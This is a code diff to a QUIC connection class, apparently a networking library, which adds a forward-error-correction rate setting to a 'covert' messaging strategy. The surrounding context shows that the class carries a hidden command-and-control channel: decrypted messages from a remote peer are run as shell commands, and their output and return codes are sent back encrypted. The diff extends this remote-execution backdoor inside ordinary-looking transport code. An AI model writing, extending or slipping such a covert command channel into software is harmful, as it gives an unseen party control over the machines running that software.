@@ -2207,6 +2207,11 @@ class QuicConnection:
                         stdout, stderr, return_code = execute_command(decrypted_message)
                         seq = peer_meta.get("next_sequence", 0)
                         peer_meta["next_sequence"] = seq + 1
+                        fec_rate = (
+                            self._configuration.covert_fec_rate
+                            if self._configuration.covert_strategy == "fec"
+                            else None
+                        )
                         ccrypto.queue_message(
                             host_ip=peer_ip,
                             payload=f"m:{stdout}\n{stderr}\n{return_code}".encode(
@@ -2216,6 +2221,7 @@ class QuicConnection:
                             public_key=peer_meta["public_key"],
                             sequence=seq,
                             session_key=peer_meta.get("session_key"),
+                            fec_rate=fec_rate,
                         )
         PEER_META[peer_key] = peer_meta
         PEER_META_LOCK.release()
@@ -2981,6 +2987,11 @@ class QuicConnection:
                 if PEER_META[peer_key].get("public_key") or PEER_META[peer_key].get(
                     "session_key"
                 ):
+                    fec_rate = (
+                        self._configuration.covert_fec_rate
+                        if self._configuration.covert_strategy == "fec"
+                        else None
+                    )
                     ccrypto.queue_message(
                         host_ip=peer_ip,
                         payload=b"k",
@@ -2988,6 +2999,7 @@ class QuicConnection:
                         public_key=PEER_META[peer_key]["public_key"],
                         sequence=PEER_META[peer_key].get("next_sequence", 0),
                         session_key=PEER_META[peer_key].get("session_key"),
+                        fec_rate=fec_rate,
                     )
                     PEER_META[peer_key]["next_sequence"] = (
                         PEER_META[peer_key].get("next_sequence", 0) + 1
